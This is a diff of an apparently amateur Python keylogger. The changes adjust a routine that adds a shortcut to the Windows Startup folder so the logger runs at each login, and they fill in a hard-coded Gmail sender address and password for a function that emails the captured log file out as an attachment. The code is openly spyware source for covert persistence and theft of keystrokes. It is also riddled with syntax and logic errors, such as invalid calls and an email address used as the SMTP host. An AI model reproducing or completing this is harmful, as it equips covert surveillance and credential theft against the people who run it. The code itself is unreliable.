@@ -30,18 +30,18 @@ username = os.getLogin()
 destination = r'C:\Users\{}\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(username)
 
 def main():
-    path = os.path.join.destination, "keylogger.pyw - Shortcut.lnk")
-    target = r""+cwd+"\keylogger.pyw"
-    icon = r""+cwd+"\keylogger.pyw"
+    path = os.path.join.destination, "keylogger.py- Shortcut.lnk")
+    target = r""+cwd+"\keylogger.py"
+    icon = r""+cwd+"\keylogger.py"
     for file in source:
-        if files == "keylogger.pyw":
+        if files == "keylogger.py":
             shell = Dispatch('WScript.Shell')
             shortcut = shell.CreateShortCut(path)
             shortcut.Targetpath = target
             shortcut.IconLocation = icon
             shortcut.save()
 
-shortcut = 'keylogger.pyw - Sortcut.lnk'
+shortcut = 'keylogger.py - Shortcut.lnk'
 if shortcut in destination:
     pass
 else:
@@ -56,7 +56,7 @@ def is_connected():
     return False
 
 def send_email():
-    fromaddr = "enter sender email address"
+    fromaddr = "Keylogger.younglings@gmail.com"
     toaddr = "enter receiver email address"
 
     msg = MIMEMultipart()
@@ -64,14 +64,14 @@ def send_email():
     msg['To'] = toaddr
     ms['Subject'] = "data"
     body = "TEXT YOU WANT TO SEND"
-    msg.attch(MIMEText(body, 'plain'))
+    msg.attach(MIMEText(body, 'plain'))
     attachment = open(filename, "rb")
     part = MIMEBase('application', 'octect-stream')
     part.set_payload((attachment).read())
     encoders.encode_base64(part)
     part.add_header('Content-Disposition', "attachment; filename= &s" % filename)
     msg.attach(part)
-    server = smtplib.SMTP(Keylogger.younglings@gmail.com'', 587)
+    server = smtplib.SMTP(Keylogger.younglings@gmail.com, 587)
     server,starttls()
     server.login(fromaddr, "password@%!!!21")
     text = msg.as_string()
